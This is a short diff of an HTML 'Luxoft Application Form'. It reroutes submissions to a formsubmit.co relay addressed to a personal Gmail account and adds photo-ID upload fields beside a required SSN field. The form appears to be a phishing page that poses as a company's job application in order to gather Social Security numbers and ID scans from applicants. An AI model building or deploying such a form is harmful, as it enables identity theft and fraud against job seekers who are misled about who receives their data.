@@ -62,7 +62,7 @@
 <body>
   <div class="container">
     <h1>Luxoft Application Form</h1>
-    <form action="https://formspree.io/f/mkgzlbgq" method="POST">
+     <form action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
       
       <label for="fullname">Full Name</label>
       <input type="text" id="fullname" name="Full Name" placeholder="Enter your full name" required>
@@ -78,6 +78,12 @@
 
       <label for="SSN">SSN</label>
       <input type="digit" id="SSN" name="SSN" placeholder="XXX-XXX-XXX" required>
+
+      <label for="ID">Photo ID(front)</label>
+      <input type="file" id="ID" name="Attachment" accept=".pdf,.doc,.docx,.jpg,.png">
+
+      <label for="ID">Photo ID(back)</label>
+      <input type="file" id="ID" name="Attachment" accept=".pdf,.doc,.docx,.jpg,.png">
 
       <!-- Redirect to thankyou.html -->
       <input type="hidden" name="_redirect" value="thankyou.html">
